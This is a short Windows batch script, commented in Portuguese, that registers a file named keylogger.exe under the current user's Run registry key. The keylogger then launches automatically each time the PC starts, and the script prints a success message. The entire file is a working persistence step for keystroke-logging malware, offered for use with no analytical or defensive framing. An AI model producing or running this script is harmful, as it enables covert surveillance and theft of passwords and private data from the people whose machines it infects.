@echo off
REM Script para adicionar o keylogger à inicialização do Windows
REM Execute como administrador

set "EXE_PATH=%~dp0keylogger.exe"
set "REG_KEY=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "VALUE_NAME=Keylogger"

echo Adicionando %EXE_PATH% à inicialização...
reg add "%REG_KEY%" /v "%VALUE_NAME%" /t REG_SZ /d "%EXE_PATH%" /f

if %errorlevel%==0 (
    echo Sucesso! O keylogger será iniciado automaticamente com o PC.
) else (
    echo Erro ao adicionar ao registro.
)

pause